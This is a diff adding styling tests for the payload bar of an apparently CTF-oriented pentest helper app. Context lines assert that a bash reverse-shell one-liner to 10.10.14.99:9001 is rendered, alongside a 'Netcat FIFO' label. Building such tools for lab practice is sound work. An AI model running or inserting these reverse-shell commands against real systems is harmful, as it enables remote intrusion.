@@ -64,4 +64,49 @@ describe('FloatingPayloadBar component', () => {
     expect(screen.getByText('Netcat FIFO')).toBeInTheDocument();
     expect(screen.getByText(/bash -i >& \/dev\/tcp\/10\.10\.14\.99\/9001/)).toBeInTheDocument();
   });
+
+  it('renders active target machine name and IP with proper contrast styling in light mode', () => {
+    useCtfStore.setState({
+      machines: [
+        {
+          id: 'test-box',
+          name: 'Pickle Rick',
+          ip: '10.10.10.42',
+          os: 'Linux',
+          platform: 'HTB',
+          difficulty: 'Easy',
+          status: 'backlog',
+          tags: ['Web'],
+          certifications: [],
+          roomUrl: '',
+          timeSpentSeconds: 0,
+          createdAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString(),
+        },
+      ],
+      activeTargetId: 'test-box',
+    });
+
+    render(<FloatingPayloadBar />);
+    const targetName = screen.getByText('Pickle Rick');
+    expect(targetName).toBeInTheDocument();
+    expect(targetName.className).toContain('text-slate-900');
+    expect(targetName.className).toContain('dark:text-white');
+    expect(screen.getByText('(10.10.10.42)')).toBeInTheDocument();
+  });
+
+  it('contains light mode background and border classes on minimized chip and expanded bar', () => {
+    const { container } = render(<FloatingPayloadBar />);
+    const chip = container.querySelector('[class*="bg-white/95"]');
+    expect(chip).toBeInTheDocument();
+    expect(chip?.className).toContain('dark:bg-slate-900/95');
+    expect(chip?.className).toContain('border-slate-200/90');
+
+    // Expand
+    fireEvent.click(screen.getByText('10.10.14.99:9001'));
+    const expandedBar = container.querySelector('[class*="w-[calc(100vw-1.5rem)]"]');
+    expect(expandedBar).toBeInTheDocument();
+    expect(expandedBar?.className).toContain('bg-white/95');
+    expect(expandedBar?.className).toContain('dark:bg-slate-950/95');
+  });
 });
